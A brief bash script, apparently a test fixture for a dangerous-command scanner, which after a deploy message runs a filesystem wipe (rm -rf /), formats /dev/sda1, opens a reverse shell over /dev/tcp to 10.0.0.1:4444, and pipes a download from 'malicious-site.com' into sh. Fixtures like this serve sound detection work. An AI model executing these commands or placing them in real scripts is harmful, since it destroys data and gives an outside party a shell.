#!/bin/bash
# A normal comment
echo "Deploying application..."

# Dangerous stuff for testing
rm -rf /
mkfs /dev/sda1

# Reverse shell test (Bonus 4)
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Suspicious download piping to shell
curl -s http://malicious-site.com/payload.sh | sh